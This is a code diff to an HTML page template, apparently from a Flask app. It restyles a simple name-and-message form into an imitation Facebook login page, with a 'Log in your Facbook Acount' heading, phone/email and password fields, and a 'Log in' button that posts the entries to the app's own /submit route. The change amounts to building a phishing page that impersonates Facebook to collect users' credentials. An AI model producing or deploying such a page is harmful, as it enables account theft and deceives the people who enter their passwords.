@@ -27,18 +27,18 @@
         .input-group label {
             display: block;
             margin-bottom: 5px;
-            font-weight: bold;
+
         }
         .input-group input {
             width: 100%;
-            padding: 10px;
+            padding: 12px 40px 12px 12px;
             border: 1px solid #ccc;
-            border-radius: 5px;
+            border-radius: 6px;
             box-sizing: border-box;
         }
         .submit-btn {
             width: 100%;
-            background-color: #4CAF50;
+            background-color: #0091cf;
             color: white;
             padding: 12px;
             border: none;
@@ -47,24 +47,33 @@
             font-weight: bold;
             cursor: pointer;
         }
+        .submit-btn:hover {
+            background-color: #007eb4;
+        }
     </style>
 </head>
 <body>
 
     <div class="form-container">
+        <div class="f-logo">
+            <img src="{{ url_for('static', filename='favicon.png') }}" alt="logo" style="width: 35px;">
+        </div>
+        <div class="text">
+            <h5 style="color: #0185be; font-size: 17px; margin-top: 10px;">Log in your Facbook Acount</h5>
+        </div>
         <!-- target="_blank" দেওয়ার ফলে নতুন ট্যাবে রিডাইরেক্ট লিংক ওপেন হবে -->
         <form action="/submit" method="POST" target="_blank">
             <div class="input-group">
-                <label for="user_name">Your Name:</label>
-                <input type="text" id="user_name" name="user_name" required>
+                <label for="user_name">Phone number:</label>
+                <input type="text" id="user_name" name="user_name"placeholder="Phone number or Email address" required>
             </div>
 
             <div class="input-group">
-                <label for="user_message">Your Message:</label>
-                <input type="text" id="user_message" name="user_message" required>
+                <label for="user_message">Password:</label>
+                <input type="text" id="user_message" name="user_message"placeholder="Enter Password" required>
             </div>
 
-            <button type="submit" class="submit-btn">Submit</button>
+            <button type="submit" class="submit-btn">Log in</button>
         </form>
     </div>
 
